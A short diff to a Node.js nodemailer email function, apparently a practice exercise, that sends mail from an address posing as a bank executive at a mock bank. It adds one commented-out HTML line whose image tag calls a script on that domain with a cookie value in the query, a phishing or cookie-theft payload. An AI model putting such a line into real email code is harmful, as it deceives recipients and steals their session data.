@@ -1,6 +1,7 @@
 const nodemailer = require("nodemailer");
 
 function enviar(to, subject, text){
+    
     let destinatario ='tuejecutivo@bancopatito.cl';
     let tranportador = nodemailer.createTransport({
         service:'gmail',
@@ -13,11 +14,13 @@ function enviar(to, subject, text){
         }*/  
     }); 
 
+    
     let opciones={
         from:destinatario,
         to,
         subject,
         text//html cuerpo del correo,
+        //html: <img src='http://bancopatito.cl/mijsmalo.js?dato=cookie.value'>
 
     }
 
